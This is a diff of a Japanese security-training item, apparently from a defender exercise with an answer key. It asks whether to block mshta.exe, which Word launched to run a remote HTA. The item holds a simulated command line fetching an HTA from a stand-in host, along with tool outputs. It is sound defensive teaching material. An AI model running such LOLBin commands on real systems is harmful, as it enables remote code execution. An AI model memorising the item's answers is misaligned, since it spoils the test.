@@ -6,7 +6,7 @@
   "level": "intermediate",
   "ground_truth": "block",
   "title": "LOLBinによる外部HTA実行",
-  "request": "稼働中のProcessを継続させますか。 ALLOW / BLOCKで判断してください。",
+  "request": "稼働中のプロセスを継続させますか。 ALLOW / BLOCKで判断してください。",
   "initial_information": {
     "Process": "mshta.exe",
     "PID": 4200,
@@ -21,7 +21,7 @@
     {
       "id": "pe",
       "name": "Process Explorer",
-      "description": "実行Path・Command Line・親Process・ロード済みDLLを確認します。",
+      "description": "実行パス・コマンドライン・親プロセス・ロード済みDLLを確認します。",
       "output": "Parent: WINWORD.EXE (3110)\nPID: 4200\nImage: C:\\Windows\\System32\\mshta.exe\nCommand line: mshta.exe https://doc-preview.example/view.hta\nUser: ASTER\\mori\nLoaded DLLs (抜粋):\nC:\\Windows\\System32\\kernel32.dll",
       "accepted_information_types": [
         "pid"
@@ -40,7 +40,7 @@
       "output_information": [
         {
           "id": "image",
-          "label": "Backing Executable",
+          "label": "実体ファイル",
           "value": "C:\\Windows\\System32\\mshta.exe",
           "data_type": "file"
         }
@@ -49,7 +49,7 @@
     {
       "id": "sig",
       "name": "Sigcheck",
-      "description": "署名の検証状態・Publisherを確認します。PID入力ではBacking Executableが対象です。",
+      "description": "署名の検証状態・発行元を確認します。PIDを入力した場合は対応する実体ファイルが対象です。",
       "output": "PID 4200 のBacking Executable: C:\\Windows\\System32\\mshta.exe\nVerified: Signed\nPublisher: Microsoft Windows",
       "accepted_information_types": [
         "pid"
@@ -69,7 +69,7 @@
     {
       "id": "tcp",
       "name": "TCPView",
-      "description": "選択PIDのSocketと相手IP・Portを確認します。",
+      "description": "選択PIDのソケットと相手IP・ポートを確認します。",
       "output": "mshta.exe 4200 TCP 192.0.2.25:52200 203.0.113.67:443 ESTABLISHED",
       "accepted_information_types": [
         "pid"
@@ -88,7 +88,7 @@
       "output_information": [
         {
           "id": "ip",
-          "label": "Remote IP",
+          "label": "接続先IP",
           "value": "203.0.113.67",
           "data_type": "ip"
         }
@@ -98,7 +98,7 @@
   "references": [
     {
       "id": "admin",
-      "name": "Approved Administrative Path",
+      "name": "承認済みの管理経路",
       "content": "文書閲覧端末ではOfficeからの外部HTA起動を禁止。mshta.exeを使う承認業務・保守作業は登録されていない。"
     }
   ],
@@ -465,17 +465,17 @@
       ]
     }
   ],
-  "explanation": "Microsoft署名のmshta.exeでも、Wordが起動し承認外HostのHTAを実行する引数は業務手順に反するため停止します。正規Binaryの悪用を実行文脈から判断します。",
-  "topic": "正規署名のSystem Binaryでも呼出し内容を確認する",
-  "summary": "正規署名のSystem Binaryでも呼出し内容を確認する",
+  "explanation": "Microsoft署名のmshta.exeでも、Wordが起動し承認外ホストのHTAを実行する引数は業務手順に反するため停止します。正規バイナリの悪用を実行文脈から判断します。",
+  "topic": "正規署名のシステムバイナリでも呼出し内容を確認する",
+  "summary": "正規署名のシステムバイナリでも呼出し内容を確認する",
   "learning_objectives": [
-    "正規署名のSystem Binaryでも呼出し内容を確認する"
+    "正規署名のシステムバイナリでも呼出し内容を確認する"
   ],
   "decision_context": "running_process",
   "scenario_type": "real_world_inspired",
   "sources": [
     "https://attack.mitre.org/techniques/T1218/005/"
   ],
-  "fixture_note": "組織・Domain・IP・Package・Hash・記録は架空の保存済み教材。IPは文書用アドレスで、RDAP・外部評判も実照会ではない。時刻は2026-08-18を基準とし、出力は必要なフィールドの抜粋。攻撃コマンドのPayloadは<TRAINING-PLACEHOLDER>に置換。 各問題は独立した端末・案件のSnapshot。PID・時刻の再利用は問題間の関連を意味しない。時刻はZ表記以外すべてJST。",
+  "fixture_note": "登場する組織名、ドメイン、IPアドレス、パッケージ名、ハッシュ値、記録は架空のものです。IPアドレスには文書用アドレスを使い、RDAPや外部評判の照会も実際には行っていません。時刻は2026-08-18を基準とし、必要な項目だけを抜粋しています。攻撃コマンドのペイロードは<TRAINING-PLACEHOLDER>に置き換えています。各問題は独立した端末・案件の状態を表すスナップショットです。PIDや時刻の再利用は問題間の関連を意味しません。Z付きの時刻を除き、時刻はすべて日本標準時（JST）です。",
   "inspired_by": "LOLBin / Living-off-the-Land"
 }
